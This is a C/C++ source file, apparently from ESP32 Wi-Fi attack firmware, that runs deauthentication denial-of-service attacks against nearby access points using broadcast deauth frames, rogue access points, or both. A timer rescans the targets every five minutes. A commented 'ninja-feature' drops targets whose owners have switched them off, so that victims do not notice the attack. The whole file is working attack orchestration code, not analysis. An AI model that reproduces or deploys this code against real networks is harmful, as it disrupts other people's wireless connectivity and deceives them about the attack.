/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include <array>
#include <vector>

#include "Timer.h"
#include "attack.h"
#include "attack_method.h"
#include "esp_err.h"
#include "esp_log.h"
#include "wifi_controller.h"

namespace {
const char* TAG = "main:attack_dos";
attack_dos_methods_t gMethod = attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID;
Timer gApRevisionTimer;
constexpr uint32_t kApRevisionTimerTimeoutS{5 * 60};
}  // namespace

void attack_dos_start_impl(attack_config_t attack_config);
void attack_dos_stop_impl();

void startApRevisionTimer(attack_config_t attack_config) {
  std::vector<std::array<uint8_t, 6>> originalApMacs;
  for (const auto& ap_record : attack_config.ap_records) {
    originalApMacs.push_back(std::to_array(ap_record->bssid));
  }
  gApRevisionTimer.start(
      kApRevisionTimerTimeoutS,
      [originalAttackConfig = std::move(attack_config), originalApMacs = std::move(originalApMacs)]() {
        if (gMethod != attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID) {
          attack_dos_stop_impl();
        }

        attack_config_t updatedAttackConfig{originalAttackConfig};
        updatedAttackConfig.ap_records.clear();
        wifictl_scan_nearby_aps();
        for (const auto& mac : originalApMacs) {
          auto wifi_ap_record_ptr = wifictl_get_ap_record_by_mac(mac.data());
          if (wifi_ap_record_ptr == nullptr) {
            // Ninja-feature :) Victim could suspect that he is under attack and turned AP off. So, we should also stop
            // attacking it, because in case of RogueAP we are creating WiFi with the same name and it will look
            // suspecious to the victim, that he turned off WiFi, but it is still online.
            // So, we are ignoring all those APs from the original list, which we could not detect right now.
            ESP_LOGI(TAG,
                     "After rescanning of APs could not find AP with MAC '%02x:%02x:%02x:%02x:%02x:%02x'. Ignore it.",
                     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            continue;
          }
          updatedAttackConfig.ap_records.push_back(std::move(wifi_ap_record_ptr));
        }

        if (updatedAttackConfig.ap_records.size() > 0) {
          attack_dos_start_impl(std::move(updatedAttackConfig));
        }
      },
      true);
}

void attack_dos_start(attack_config_t attack_config) {
  gApRevisionTimer.stop();

  attack_dos_start_impl(attack_config);

  if (isInfiniteAttack(attack_config)) {
    startApRevisionTimer(std::move(attack_config));
  }
}

void attack_dos_start_impl(attack_config_t attack_config) {
  ESP_LOGI(TAG, "Starting DoS attack...");
  gMethod = (attack_dos_methods_t)attack_config.method;
  switch (gMethod) {
    case ATTACK_DOS_METHOD_BROADCAST:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
      attack_method_broadcast(attack_config.ap_records, 1);
      break;
    case ATTACK_DOS_METHOD_ROGUE_AP:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
      attack_method_rogueap(attack_config.ap_records, attack_config.per_ap_timeout);
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_COMBINE_ALL");
      attack_method_rogueap(attack_config.ap_records, attack_config.per_ap_timeout);
      attack_method_broadcast(attack_config.ap_records, 1);
      break;
    default:
      ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
  }
}

void attack_dos_stop() {
  gApRevisionTimer.stop();
  attack_dos_stop_impl();
}

void attack_dos_stop_impl() {
  switch (gMethod) {
    case ATTACK_DOS_METHOD_BROADCAST:
      attack_method_broadcast_stop();
      break;
    case ATTACK_DOS_METHOD_ROGUE_AP:
      attack_method_rogueap_stop();
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      attack_method_broadcast_stop();
      attack_method_rogueap_stop();
      break;
    default:
      ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
  }

  gMethod = attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID;

  ESP_LOGI(TAG, "DoS attack stopped");
}
